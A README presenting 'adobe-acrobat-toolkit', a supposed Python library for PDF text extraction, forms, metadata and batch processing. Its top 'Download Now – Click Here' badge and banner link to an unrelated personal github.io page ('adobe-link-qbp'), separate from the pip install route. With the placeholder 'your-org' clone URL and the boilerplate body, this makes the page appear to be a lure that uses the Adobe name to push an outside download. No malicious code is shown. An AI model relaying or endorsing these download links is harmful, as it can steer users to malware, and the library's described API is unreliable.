# adobe-acrobat-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://sathyakumar92.github.io/adobe-link-qbp/)


[![Banner](banner.png)](https://sathyakumar92.github.io/adobe-link-qbp/)


[![PyPI version](https://badge.fury.io/py/adobe-acrobat-toolkit.svg)](https://badge.fury.io/py/adobe-acrobat-toolkit)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![Documentation Status](https://readthedocs.org/projects/adobe-acrobat-toolkit/badge/?version=latest)](https://adobe-acrobat-toolkit.readthedocs.io)

A Python toolkit for automating PDF workflows, extracting structured data, and integrating Adobe Acrobat document processing into your data pipelines.

This library provides a clean, Pythonic interface for interacting with PDF documents — whether you are batch-processing reports, extracting form field data, or analyzing document metadata at scale. It is designed for developers and data engineers who work with Acrobat-compatible PDF files in production environments.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Requirements](#requirements)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- **PDF Text Extraction** — Extract plain text and structured content from single or batch PDF files
- **Form Field Processing** — Read and populate AcroForm fields programmatically
- **Document Metadata Analysis** — Query author, creation date, modification history, and XMP metadata
- **Page-Level Operations** — Split, merge, rotate, and reorder pages with a fluent API
- **Annotation Handling** — Read, create, and modify PDF annotations and comments
- **Batch Workflow Automation** — Process hundreds of documents using simple pipeline definitions
- **OCR Integration** — Coordinate with OCR engines to extract text from scanned PDF pages
- **Export Utilities** — Convert PDF content to JSON, CSV, or plain text for downstream processing

---

## Installation

Install the latest stable release from PyPI:

```bash
pip install adobe-acrobat-toolkit
```

To include optional OCR support:

```bash
pip install adobe-acrobat-toolkit[ocr]
```

For development dependencies:

```bash
git clone https://github.com/your-org/adobe-acrobat-toolkit.git
cd adobe-acrobat-toolkit
pip install -e ".[dev]"
```

---

## Quick Start

```python
from acrobat_toolkit import PDFDocument

# Open a PDF file
doc = PDFDocument("report_q4.pdf")

# Extract all text content
text = doc.extract_text()
print(text[:500])

# Access document metadata
meta = doc.metadata
print(f"Author: {meta.author}")
print(f"Created: {meta.created_at}")
print(f"Pages: {doc.page_count}")

doc.close()
```

---

## Usage Examples

### Extracting Text from Multiple Pages

```python
from acrobat_toolkit import PDFDocument

with PDFDocument("annual_report.pdf") as doc:
    for page_num, page in enumerate(doc.pages, start=1):
        text = page.extract_text()
        print(f"--- Page {page_num} ---")
        print(text)
```

### Reading and Populating Form Fields

```python
from acrobat_toolkit import PDFForm

# Load a PDF with AcroForm fields
form = PDFForm("application_form.pdf")

# Inspect available fields
for field in form.fields:
    print(f"Field: {field.name} | Type: {field.field_type} | Value: {field.value}")

# Populate fields and save a filled copy
form.fill({
    "first_name": "Jane",
    "last_name": "Doe",
    "email": "jane.doe@example.com",
    "date_of_birth": "1990-06-15",
})

form.save("application_form_filled.pdf")
```

### Batch Processing a Directory of PDFs

```python
import pathlib
from acrobat_toolkit import BatchProcessor

pdf_dir = pathlib.Path("./invoices")

processor = BatchProcessor(
    source_dir=pdf_dir,
    output_format="json",
    extract_fields=["invoice_number", "total_amount", "due_date"],
)

results = processor.run()

for result in results:
    print(f"{result.filename}: {result.extracted_data}")
```

### Extracting and Exporting Document Metadata

```python
from acrobat_toolkit import PDFDocument
import json

with PDFDocument("contract.pdf") as doc:
    metadata = {
        "title": doc.metadata.title,
        "author": doc.metadata.author,
        "subject": doc.metadata.subject,
        "keywords": doc.metadata.keywords,
        "creator_tool": doc.metadata.creator,
        "created_at": str(doc.metadata.created_at),
        "modified_at": str(doc.metadata.modified_at),
        "page_count": doc.page_count,
        "is_encrypted": doc.is_encrypted,
        "pdf_version": doc.pdf_version,
    }

print(json.dumps(metadata, indent=2))
```

### Splitting and Merging PDF Documents

```python
from acrobat_toolkit import PDFDocument, PDFMerger

# Split a document into individual pages
with PDFDocument("full_report.pdf") as doc:
    doc.split_pages(output_dir="./pages/")

# Merge selected pages from multiple documents
merger = PDFMerger()
merger.append("cover_page.pdf", pages=(0, 1))
merger.append("chapters.pdf", pages=(2, 15))
merger.append("appendix.pdf")
merger.save("compiled_report.pdf")
```

### Working with Annotations

```python
from acrobat_toolkit import PDFDocument

with PDFDocument("reviewed_document.pdf") as doc:
    for page in doc.pages:
        for annotation in page.annotations:
            print(f"Type: {annotation.annotation_type}")
            print(f"Author: {annotation.author}")
            print(f"Content: {annotation.content}")
            print(f"Created: {annotation.created_at}")
            print("---")
```

---

## Requirements

| Requirement | Version |
|---|---|
| Python | >= 3.8 |
| `pypdf` | >= 3.0 |
| `pdfminer.six` | >= 20221105 |
| `Pillow` | >= 9.0 (optional, for image extraction) |
| `pytesseract` | >= 0.3 (optional, for OCR support) |
| `pydantic` | >= 2.0 |
| `rich` | >= 13.0 (optional, for CLI output) |

Install all optional dependencies:

```bash
pip install adobe-acrobat-toolkit[all]
```

---

## Project Structure

```
adobe-acrobat-toolkit/
├── acrobat_toolkit/
│   ├── __init__.py
│   ├── document.py       # Core PDFDocument class
│   ├── forms.py          # AcroForm field handling
│   ├── metadata.py       # XMP and document info parsing
│   ├── batch.py          # BatchProcessor pipeline
│   ├── merger.py         # Split and merge utilities
│   ├── annotations.py    # Annotation read/write support
│   └── cli.py            # Optional command-line interface
├── tests/
├── docs/
├── pyproject.toml
└── README.md
```

---

## Contributing

Contributions are welcome. Please follow these steps:

1. Fork the repository and create a feature branch:
   ```bash
   git checkout -b feature/your-feature-name
   ```

2. Install development dependencies:
   ```bash
   pip install -e ".[dev]"
   ```

3. Write tests for your changes and ensure the full suite passes:
   ```bash
   pytest tests/ --cov=acrobat_toolkit
   ```

4. Run the linter and formatter before submitting:
   ```bash
   black acrobat_toolkit/
   ruff check acrobat_toolkit/
   ```

5. Open a pull request with a clear description of your changes.

Please read [CONTRIBUTING.md](CONTRIBUTING.md) for details on our code of conduct and pull request process.

---

## License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for full details.

---

> **Note:** This toolkit operates on PDF files that conform to the PDF specification. It is not affiliated with, endorsed by, or sponsored by Adobe Inc. Adobe and Acrobat are registered trademarks of Adobe Inc.